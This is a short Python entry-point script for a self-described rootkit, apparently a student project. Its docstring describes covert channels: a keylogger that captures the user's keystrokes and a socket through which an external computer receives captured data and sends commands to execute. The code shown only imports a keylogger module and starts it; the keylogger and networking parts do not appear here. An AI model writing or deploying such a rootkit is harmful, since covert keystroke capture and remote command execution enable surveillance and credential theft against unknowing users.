#/bin/python

import keylogger.model as kl

"""
The entry point to the rootkit will setup a series of covert channels for
collecting information from the user.  The first is a keylogger that will
begin to capture keys that are being hit, as well as a socket to receive
 data from an external computer.

This external computer will receive packets containing information captured
by the keylogger. The external computer can then send information to the
rootkit to execute particular commands and send the results back to the
calling computer.
"""

__author__ = "Nathaniel Cotton"
__email__ = "nec2887@rit.edu"


def main():
    """
    Entry point into the application, that will setup the keylogger
    and the networking functionality.
    :return:
    """
    keylogger = kl.getKeyLogger()
    keylogger.start()



if __name__ == '__main__':
    main()
